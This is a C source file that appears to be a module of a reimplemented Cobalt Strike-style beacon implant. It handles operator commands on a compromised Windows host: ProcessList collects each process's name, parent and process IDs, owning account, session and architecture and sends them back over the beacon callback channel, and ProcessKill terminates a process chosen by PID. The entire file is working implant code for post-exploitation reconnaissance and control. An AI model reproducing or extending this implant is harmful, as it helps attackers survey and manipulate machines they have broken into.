#include "pch.h"

#include "process.h"

#include "beacon.h"

#include "spawn.h"

BOOL GetAccountNameFromToken(HANDLE hProcess, char* accountName, int length) {
	HANDLE hToken;
	BOOL result = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
	if (!result) {
		return FALSE;
	}

	result = IdentityGetUserInfo(hToken, accountName, length);
	CloseHandle(hToken);
	return result;
}

void ProcessList(char* buffer, int length) {
	char accountName[2048] = { 0 };

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int isPending = BeaconDataInt(&parser);

	formatp locals;
	BeaconFormatAlloc(&locals, 0x8000);

	if (isPending > 0) {
		BeaconFormatInt(&locals, isPending);
	}

	char* arch;
	if (IS_X64() || IsWow64ProcessEx(GetCurrentProcess())) {
		arch = "x64";
	} else {
		arch = "x86";
	}

	HANDLE toolhelp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (toolhelp == INVALID_HANDLE_VALUE) {
		goto cleanup;
	}

	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (Process32First(toolhelp, &pe)) {
		do {
			HANDLE hProcess = OpenProcess(SelfIsWindowsVistaOrLater() ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
			DWORD sid;
			if (hProcess) {
				if (!GetAccountNameFromToken(hProcess, accountName, sizeof(accountName))) {
					accountName[0] = '\0';
				}

				if (!ProcessIdToSessionId(pe.th32ProcessID, &sid)) {
					sid = -1;
				}

				BOOL isWow64 = IsWow64ProcessEx(hProcess);

				BeaconFormatPrintf(&locals,
					"%s\t%d\t%d\t%s\t%s\t%d\n",
					pe.szExeFile,
					pe.th32ParentProcessID,
					pe.th32ProcessID,
					isWow64 ? "x86" : arch,
					accountName,
					sid);
			}
			else {
				BeaconFormatPrintf(&locals,
					"%s\t%d\t%d\n",
					pe.szExeFile,
					pe.th32ParentProcessID,
					pe.th32ProcessID);
			}
			CloseHandle(hProcess);
		} while (Process32Next(toolhelp, &pe));

		CloseHandle(toolhelp);

		int cbLength = BeaconDataLength(&locals);
		char* cbBuffer = BeaconDataOriginal(&locals);

		BeaconOutput(isPending ? CALLBACK_PENDING : CALLBACK_PROCESS_LIST, cbBuffer, cbLength);
	} else {
		CloseHandle(toolhelp);
	}
	
cleanup:
	BeaconFormatFree(&locals);
}

BOOL ProcessKill(char* buffer, int length) {
	datap parser = { 0 };
	BeaconDataParse(&parser, buffer, length);
	int pid = BeaconDataInt(&parser);
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (!hProcess || !TerminateProcess(hProcess, 0)) {
		int lastError = GetLastError();
		LERROR("Could not kill %d: %s", pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_KILL_FAILED, pid, lastError);
	}
	return CloseHandle(hProcess);
}